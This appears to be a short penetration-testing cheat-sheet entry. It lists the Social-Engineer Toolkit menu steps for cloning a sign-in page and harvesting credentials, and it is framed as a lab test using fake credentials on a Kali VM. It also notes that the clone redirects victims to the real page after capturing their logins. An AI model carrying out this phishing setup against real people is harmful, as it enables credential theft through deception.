## Social Engineering
The Social-Engineer Toolkit is an open-source penetration testing framework designed for social engineering

[SET](https://github.com/trustedsec/social-engineer-toolkit)

### 1. Credential Harvesting via Site Cloner
- Run the Social-Engineer Toolkit
```bash
sudo setoolkit
```

set the desired mode of operation:
```bash
set> 1   # For "Social-Engineering Attacks"
set> 2   # For "Website Attack Vectors"
set:webattack> 3   # For "Credential Harvester Attack"
set:webattack> 2   # For "Site Cloner"
```

Enter the IP address of the Host receiving the credentials, the default is probably fine (Kali VM)

Enter the website that you wish to clone:
```bash
set:webattack> https://example.com/signin
```

- Launch the web browser in Kali and visit the page at the default address.

Enter a fake username and password, and confirm that you see those credentials in the SET console.

Note that the cloned website redirects to the real login page after swiping the credentials.

Since the `setoolkit` is run as root, the results are stored in root folder.
```bash
sudo cp -R /root/.set/reports ~ && sudo chown -R $USER:$USER ~/reports
```
